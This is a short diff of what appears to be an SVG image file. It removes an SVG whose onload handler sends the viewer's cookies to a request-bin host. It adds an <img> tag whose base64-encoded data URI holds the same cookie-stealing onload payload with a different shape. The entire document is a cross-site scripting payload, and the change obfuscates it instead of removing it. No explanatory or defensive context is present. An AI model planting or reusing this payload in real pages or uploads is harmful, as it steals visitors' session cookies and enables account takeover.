@@ -1,4 +1,1 @@
-<?xml version="1.0" standalone="no"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="location='https://your-request-bin.com?c='+document.cookie">
-  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
-</svg>
+<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIG9ubG9hZD0ibG9jYXRpb249J2h0dHBzOi8veW91ci1yZXF1ZXN0LWJpbi5jb20/Yz0nK2RvY3VtZW50LmNvb2tpZSI+CjxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiBmaWxsPSJibHVlIiAvPgo8L3N2Zz4=" />
